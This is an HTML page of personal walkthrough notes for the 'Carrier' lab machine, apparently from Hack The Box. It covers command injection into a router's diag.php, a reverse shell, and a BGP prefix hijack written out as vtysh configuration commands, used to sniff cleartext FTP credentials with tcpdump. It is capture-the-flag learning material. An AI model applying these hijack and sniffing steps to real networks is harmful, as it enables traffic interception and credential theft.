<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Carrier - Routers BGP Hijacking</title>
</head><body>Gobuster and find some documents (network diagrams, error codes, etc)<br/>
Error code reveals default password is chasis serial number<br/>
<br/>
SNMP enumerate and find the serial number<br/>
Login to Lyghtspeed web interface<br/>
<br/>
Ticket #6 provides interesting information<br/>
Issues with networks (10.120.15,10.120.16,10.120.17/24's) and they have issues connecting to FTP in 10.120.15.0/24<br/>
<br/>
diag.php, command injection! (like ps | grep {user_input})<br/>
default is set to monitor "quagga" <br/>
<br/>
Reverse shell works fine<br/>
root@r1:~# <br/>
test_intercept.pcap<br/>
user.txt<br/>
<br/>
we're in some sort of container, cat /proc/1/environ<br/>
container=lxc<br/>
<br/>
Interesting recon opportnity: ssh-keyscan<br/>
Will show the keys for an ssh instance. run ssh-keyscan localhost and ssh-keyscan 10.10.10.105 and see that they are different<br/>
This lets us know that we are in a different location than the host that we scanned (we're in a container not on the host)<br/>
<br/>
Check out: arp -an<br/>
To look for additional hosts that are talking to the container<br/>
We know that there's an FTP server in 10.120.15.0/24, and ping 10.120.15.1 replies correctly. Let's try to scan into 10.120.15.0/24<br/>
Copy nmap (static) to the host and start scanning<br/>
nmap -vvv -Pn -p 21 10.120.15.0/24 --open<br/>
--open specifies we only want something to be listed if it's open (ie no closed/filtered)<br/>
FTP is listening on 10.120.15.10!<br/>
<br/>
vsFTPd 3.0.3<br/>
anonymous login is successful!<br/>
But nothing too useful<br/>
<br/>
<br/>
netstat listening shows a lot of BGP listening<br/>
look at stuff in crontab -l<br/>
stopping a service 'quagga' and killall vtysh, so let's check out what quagga is and it's configuration files<br/>
/etc/quagga/zebra.conf<br/>
/etc/quagga/bgpd.conf<br/>
<br/>
zebra looks like a Cisco ios config file<br/>
bgpd looks like bgp routing table<br/>
neighbor 10.78.10.2 remote-as 200 (Zaza Com AS200)<br/>
neighbor 10.78.11.2 remote-as 300 (Cast Com AS300)<br/>
<br/>
vtysh is a command line interface, much like CISCO<br/>
<br/>
By now we can kind of assume that a BGP hijack is the way to go (or other bgp attacks)<br/>
Trying to find out where our FTP guy is, but traceroute is not available, only traceroute6. We can use vtysh<br/>
vtysh<br/>
r1# show ip route 10.120.15.10<br/>
&nbsp;&#09;known via "bgp", distance 20, metric 0, best<br/>
&nbsp;&#09;* 10.78.11.2, via eth2<br/>
<br/>
Cool, so we can see it routing through CastCom AS300<br/>
<br/>
r1# show ip bgp summary<br/>
Peers 2<br/>
Shows our neighbors as expected<br/>
<br/>
Side tangeant: https://ipinfo.io can look up AS numbers and provide a ton of information including IP ranges, IP6 ranges, and more<br/>
Can use https://www.ultratools.com/tools/asninfoResult?domainName=&lt;IP address or domain name&gt; to look up the ASN numbers to plug into ipinfo.io<br/>
<br/>
r1# show ip bgp <br/>
&lt;shows all routes and their paths&gt;<br/>
<br/>
r1# show ip bgp 10.120.15.0/24<br/>
&lt;shows path for a specific route/ip and where we got the advertisement&gt;<br/>
<br/>
r1# show ip bgp neighbors &lt;ip&gt; advertised-routes<br/>
&lt;we can see paths that a speicfic ip advertises to us&gt;<br/>
<br/>
So an attack chain is that we want to see what's in that ftp server. We can advertise a route to 10.120.15.10 and sniff credentials for people logging into it. <br/>
r1# configure t &#09;&#09;&#09;&#09;&#09;&#09;&#09;enters the config interface)<br/>
r1(config)# router bgp 100&#09;&#09;&#09;&#09;&#09;in the config, there's a block labeled "router bgp 100". We want to edit that block<br/>
r1(config-router)# network 10.120.15.0/25&#09;&#09;In networking, the more specific networking usually 'wins' the preferred route<br/>
r1(config-router)# exit<br/>
r1(config)# exit<br/>
r1# clear ip bgp * out&#09;&#09;&#09;&#09;&#09;&#09;force clear and refresh of bgp routes<br/>
r1# show ip bgp 10.120.15.0/25<br/>
&lt;see that we are advertising 15.0/25 it to our peers&gt;<br/>
r1# show ip bgp neighbors 10.78.10.2 advertised-routes<br/>
&lt;see that 10.2 is also advertising our route to other its peers&gt;<br/>
r1# exit<br/>
<br/>
root# tcpdump -i any -w ftp-1.cap port 21<br/>
now we wait for captured traffic to be logged to our cap and then we can see if anyone has connected. Ftp is clear-text, so maybe usernames and passwords!<br/>
<br/>
grab the pcap from the container and analyze in wireshare or otherwise (or other favorite tool)<br/>
We can see packets grabbed from 10.78.10.2 and from 10.78.11.2, but we're not forwarding the traffic correctly. TCP Retransmissions and TCP Out-Of-Order errors. <br/>
Essentially, we created a loop. As we send traffic to the real 15.10, they look at their routing table and it says 'we' own it. So it gets sent back. <br/>
Not good!<br/>
<br/>
So we need to resolve the routing loop. One way to do this is to stop accepting routes from one of our neighbors. <br/>
This is done with route-maps<br/>
route-map to-as300 permit 10&#09;&#09;&#09;route-map (advertise routes) to-as300 (to this router) permit 10 (limit 10)<br/>
We need AS300 to send our traffic normally, so we have to block our advertisement from getting to AS300<br/>
<br/>
r1# config<br/>
r1(config)# ip prefix-list PleaseSubscribe permit 10.120.15.0/25&#09;&#09;&#09;prefix list is needed to essentially hold our ip address<br/>
r1(config)# route-map to-as300 deny 5&#09;&#09;&#09;&#09;&#09;&#09;&#09;create a new code block to deny routes to-as300<br/>
r1(config-route-map)# match ip address prefix-list PleaseSubscribe&#09;&#09;Configure the route-map to match any ip address in our prefix list<br/>
r1(config-route-map)# do show run<br/>
&lt;shows our prefix-list and the route-map to deny matching our prefix-list&gt;<br/>
r1(config-route-map)# exit<br/>
r1(config)# exit<br/>
r1# clear ip bgp * out<br/>
<br/>
Now try to ping again and analyze<br/>
Now what happens is we get responses from 78.10. It can't send traffic directly back to us, but it can send traffic to AS200 to send back to us. And that is what is happening. <br/>
So we need a way to only advertise our route to AS200. Being careful not to block all traffic because we still need a way to communicate with the FTP server. <br/>
<br/>
r1# sh ip bgp 10.120.15.0/24<br/>
we can see the route from 200-300 is still active<br/>
<br/>
Now we need to edit the route-map to-as200 and tell it to not export/forward/advertise to others<br/>
r1# config<br/>
r1(config)# route-map to-as200 permit 5<br/>
r1(config-route-map)# match ip address prefix-list PleaseSubscribe<br/>
r1(config-route-map)# set community no-export&#09;&#09;&#09;&#09;&#09;&#09;Tells the routers not to advertise the ip-addresses in the prefix list<br/>
r1(config-route-map)# end<br/>
r1# clear ip bgp * out<br/>
<br/>
and now our pings are successful!!<br/>
time to capture some packets<br/>
<br/>
see our very special USER and PASS to login to FTP and steal the secretdata.txt, root.txt, and the root ssh keys to carrier (host)<br/>
may need to use wget -m or other to grab all files<br/>
<br/>
lxc list&#09;&#09;&#09;&#09;&#09;&#09;&#09;&#09;shows all running containers<br/>
lxc exec -- &lt;container&gt; &lt;command&gt;&#09;&#09;runs a command inside of an lxc conntainer<br/>
lxc exec -- r2 bash<br/>
<br/>
Rest of the video is having fun and directing routing to Attack Machine instead of working in the container<br/>
Allows us to more actively use attacker tools to MitM the FTP session etc etc. <br/>
<br/>
</body></html>